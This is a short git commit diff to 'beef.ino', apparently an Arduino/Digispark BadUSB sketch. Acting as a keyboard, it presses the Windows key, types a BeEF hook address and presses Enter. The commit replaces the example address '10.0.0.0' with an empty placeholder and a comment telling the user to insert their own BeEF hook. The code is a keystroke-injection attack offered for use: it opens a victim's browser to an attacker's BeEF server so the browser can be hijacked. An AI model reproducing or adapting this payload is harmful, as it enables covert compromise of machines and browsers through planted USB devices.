3be51fc70af80f34fbb66f9da8695ff95197cbbf
Bertuğ Erkaya <52252889+bertugerkaya@users.noreply.github.com>
2020-04-29 03:43:08 +0300

    Update beef.ino

--- beef.ino
+++ beef.ino
@@ -11,7 +11,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("10.0.0.0"); //your beef hook
+  DigiKeyboard.print(""); //your beef hook must be here ex: 10.0.0.0
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
